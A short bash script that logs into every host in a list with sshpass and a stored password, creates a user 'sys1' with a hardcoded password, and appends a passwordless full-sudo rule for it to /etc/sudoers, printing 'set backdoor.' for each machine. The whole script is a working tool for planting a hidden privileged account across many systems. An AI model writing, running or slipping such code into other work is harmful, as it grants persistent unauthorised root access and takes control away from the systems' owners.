#!/bin/bash
cd ~/_hostsSetting
passNew=`cat ./_files/passNew`
for ip in $(cat ./_files/hosts); do
	echo $ip set backdoor.
    sshpass -p $passNew ssh $ip "useradd sys1 >/tmp/null"
    sshpass -p $passNew ssh $ip "echo password!|passwd --stdin sys1 >/tmp/null"
    sshpass -p $passNew ssh $ip "/bin/chmod 740 /etc/sudoers"
    sshpass -p $passNew ssh $ip "echo 'sys1        ALL=(ALL)       NOPASSWD: ALL'>>/etc/sudoers"
	sshpass -p $passNew ssh $ip "chmod 440 /etc/sudoers"
done
